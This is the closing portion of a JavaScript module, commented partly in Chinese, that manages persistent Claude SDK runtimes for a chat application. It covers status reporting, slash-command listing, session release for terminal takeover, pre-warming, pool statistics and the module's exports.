  log.info(`[Claude SDK] 合流:${appSessionId} 的一条消息直接进了 CLI 命令队列(uuid=${uuid})`);
  return { merged: true, uuid };
}

/**
 * REST helper:这段对话此刻有没有常驻运行时,给顶栏的「常驻会话」状态用。
 *
 * 照实报常驻池的情况:在不在、忙不忙、跑的哪个模型、空闲了多久
 * (空闲超过 PRISM_RUNTIME_IDLE_MS 会被空闲回收器收掉,所以这个数有意义)。
 */
function describeClaudeRuntime(sessionId) {
  const runtime = getPersistentRuntime(sessionId);
  if (!runtime) {
    return { resident: false, busy: false, model: null, idleMs: null, enabled: PERSISTENT_ENABLED };
  }
  return {
    resident: true,
    busy: Boolean(runtime.turn) || runtime.pendingToolUses.size > 0,
    model: runtime.currentModel || null,
    idleMs: Math.max(0, Date.now() - (runtime.lastUsed || Date.now())),
    enabled: PERSISTENT_ENABLED,
  };
}

/** REST helper: current native context usage for a conversation. */
async function getClaudeContextUsage(sessionId) {
  const runtime = getPersistentRuntime(sessionId);
  if (!runtime) return null;
  // 用户主动点的:保持 full(逐类计数)。
  return readRuntimeContextUsage(runtime);
}

/**
 * REST helper: the CLI's real slash-command list, straight from the live
 * runtime's `supportedCommands()`. Cached per runtime (the SDK captures the
 * list at initialize). Returns null when no live runtime exists.
 */
async function getClaudeSlashCommands(sessionId) {
  const runtime = getPersistentRuntime(sessionId);
  if (!runtime || typeof runtime.query?.supportedCommands !== 'function') return null;
  if (runtime.slashCommands) return runtime.slashCommands;
  try {
    const commands = await Promise.race([
      runtime.query.supportedCommands(),
      new Promise((resolve) => setTimeout(() => resolve(null), 4000)),
    ]);
    if (!Array.isArray(commands)) return null;
    runtime.slashCommands = commands
      .map((entry) => ({
        name: `/${String(entry?.name || '').replace(/^\//, '')}`,
        description: entry?.description || '',
        argumentHint: entry?.argumentHint || '',
      }))
      .filter((entry) => entry.name.length > 1);
    return runtime.slashCommands;
  } catch (error) {
    log.warn('[Claude SDK] supportedCommands failed:', error?.message || error);
    return null;
  }
}

/**
 * 放开一段对话的常驻 runtime,把所有权让给别人(目前是终端接管)。
 *
 * 两件事同时发生:进程退出让出对 transcript 的写入权,dispose 的收尾让最后一轮
 * 完整落盘 —— 终端随后 `claude --resume` 读到的才是完整记录。不 dispose 直接起
 * 第二个进程,就是现在"shell 少一截"的成因。
 *
 * 正在跑的轮次不打断:那会丢掉用户已经等了半天的回答。调用方拿到 false 时应当
 * 告诉用户"当前有对话正在进行,稍后再接管"。
 *
 * @param {string} sessionId provider-native session id(runtime map 的键)
 * @returns {Promise<{released: boolean, reason: string}>}
 */
async function releaseClaudeSession(sessionId) {
  if (!sessionId) return { released: true, reason: 'no_session' };
  // 释放意味着别的路(终端接管 / 一次性调用)要接着这段对话走,之后的用量以它为准:
  // 记下的那份用量作废,免得回到对话里时拿旧数挡切换(或该挡的没挡)。
  const forgetRemembered = () => lastRuntimeContextBySession.delete(sessionId);

  const runtime = claudeRuntimes.get(sessionId);
  if (!runtime || runtime.disposed) {
    forgetRemembered();
    return { released: true, reason: 'not_resident' };
  }
  // 在途工具 / CLI 自发的一轮都算有回合在飞:只看 `runtime.turn` 的话,终端接管会在
  // Bash 还在跑、或后台子代理正在回报时把 CLI 杀掉。
  if (!runtimeIsIdle(runtime)) {
    /*
     * 只有后台任务还在跑(没有回合)时单独报 background_tasks:按停止并不会停后台任务
     * (perTaskStopAffordance),报 turn_in_flight 会让用户无路可走。调用方据此提示先在后台任务条上停掉它们。
     */
    const onlyBackground = (runtime.liveBackgroundTasks?.size ?? 0) > 0
      && !runtime.turn && !runtime.orphanTurnOpen && (runtime.pendingToolUses?.size ?? 0) === 0;
    return { released: false, reason: onlyBackground ? 'background_tasks' : 'turn_in_flight' };
  }

  try {
    await disposePersistentRuntime(runtime);
    forgetRemembered();
    return { released: true, reason: 'disposed' };
  } catch (error) {
    log.warn('[Claude SDK] Release failed:', error?.message || error);
    return { released: false, reason: 'error' };
  }
}

/**
 * Build this conversation's resident runtime ahead of the first message.
 *
 * The runtime is otherwise created lazily inside the first send, so launching
 * the Claude subprocess, initialising the SDK and starting any configured MCP
 * servers all land on the user's first turn. Running `claude` in a terminal
 * pays exactly the same cost, but pays it while you watch it boot and before
 * you start typing — which is why the chat felt slower than the shell for the
 * same work.
 *
 * Deliberately best-effort and silent: a failed pre-warm must leave the lazy
 * path untouched, because the only thing worse than a slow first turn is a
 * first turn that fails for a reason the user never asked for. A turn already
 * in flight is left alone (runtimeForSend throws on that) and so is an
 * already-resident runtime, which returns immediately.
 *
 * The options must match what the first real send will pass: the runtime is
 * keyed by a signature over cwd, bypass, tool lists, context window, subagent
 * model and gateway (see persistentRuntimeSignature), so a mismatch just
 * disposes this runtime and builds another, wasting the work.
 */
async function prewarmClaudeSession(options = {}) {
  if (!PERSISTENT_ENABLED) return { warmed: false, reason: 'persistent_disabled' };
  if (!options.sessionId) return { warmed: false, reason: 'no_session_id' };

  const existing = claudeRuntimes.get(options.sessionId);
  if (existing && !existing.disposed) return { warmed: true, reason: 'already_resident' };

  try {
    const viewer = turnViewer(options, null);
    const effortModels = effortModelsFor(viewer);
    // 与发送路径一样按 app 会话 id 查模型覆盖(见 modelLookupSessionId):预热建出来的
    // runtime 要按用户选的模型建,而不是默认模型。
    const model = (await providerModelsService.resolveResumeModel('claude', modelLookupSessionId(options), options.model))
      || options.model;
    const resolvedEffort = resolveClaudeEffort(model, options.effort, effortModels);
    // 预热同样经过闸口、目录窗口,网关与 key 也按发起预热的人取;
    // 否则预热出来的 runtime 签名与第一条真消息对不上,白建一次。
    const { contextWindow, gateway, subagentEnv } = await modelRuntimeSettings(model, viewer);

    await runtimeForSend({ ...options, model, resolvedEffort, contextWindow, gateway, subagentEnv });
    return { warmed: true, reason: 'created' };
  } catch (error) {
    log.warn('[Claude SDK] Pre-warm skipped:', error?.message || error);
    return { warmed: false, reason: 'error' };
  }
}

/**
 * 常驻池快照,给管理面用。只读,不碰任何状态。
 *
 * 面板要回答的是"名额是不是被谁占满了" —— 所以除了总数,还按账号切一份:
 * 谁占了几个、其中几个正在跑。只有总数的话,root 只看到"20/20 满了",
 * 既不知道该找谁,也看不出公平淘汰有没有在起作用。
 */
function getRuntimePoolStats() {
  const byOwner = new Map();
  let busy = 0;
  for (const runtime of claudeRuntimes.values()) {
    const owner = runtime.ownerUserId ?? null;
    const bucket = byOwner.get(owner) ?? { userId: owner, total: 0, busy: 0 };
    bucket.total += 1;
    if (runtime.turn) {
      bucket.busy += 1;
      busy += 1;
    }
    byOwner.set(owner, bucket);
  }
  return {
    max: MAX_RUNTIMES,
    size: claudeRuntimes.size,
    busy,
    idle: claudeRuntimes.size - busy,
    idleReapMs: IDLE_RUNTIME_MS,
    oneShotOverflow: { active: activeOneShotFallbacks, max: MAX_ONESHOT_OVERFLOW },
    byOwner: [...byOwner.values()].sort((left, right) => right.total - left.total),
  };
}

// Export public API
export {
  toSdkModel,
  // 单测直接验窗口的优先级与 env
  resolveContextWindowTokens,
  modelWindowEnv,
  modelLookupSessionId,
  mapCliOptionsToSDK,
  readTurnWatchdogConfig,
  interruptWithTimeout,
  INTERRUPT_TIMEOUT_MS,
  userTurnReachedTranscript,
  collectToolUseDelta,
  collectSubagentToolUseDelta,
  queryClaudeSDK,
  prewarmClaudeSession,
  releaseClaudeSession,
  queryClaudeSDKOnce,
  abortClaudeSDKSession,
  abortClaudeSDKRun,
  // `runtimeIsIdle` 在定义处已是 `export function`,不要再列在这里:重复导出在纯 ESM 下是
  // SyntaxError,而 tsc 编译会静默去重,构建产物里看不出来。
  cancelPendingApprovalsForSession,
  isClaudeSDKSessionActive,
  getActiveClaudeSDKSessions,
  disposeAllRuntimes,
  getToolApprovalSessionId,
  resolveToolApproval,
  getPendingApprovalsForSession,
  // 单测要直接造一条待批请求来验清扫路径,没有别的入口。
  waitForToolApproval,
  getClaudeContextUsage,
  getClaudeSlashCommands,
  getPersistentRuntime,
  describeClaudeRuntime,
  getRuntimePoolStats,
  // 后台任务条
  stopClaudeBackgroundTask,
  backgroundClaudeForegroundTasks,
  // 文件回退(非 git 项目的撤销)
  rewindClaudeFiles,
  // 单测用
  interruptRuntime,
  INTERRUPT_STOP_WINDOW_MS,
};
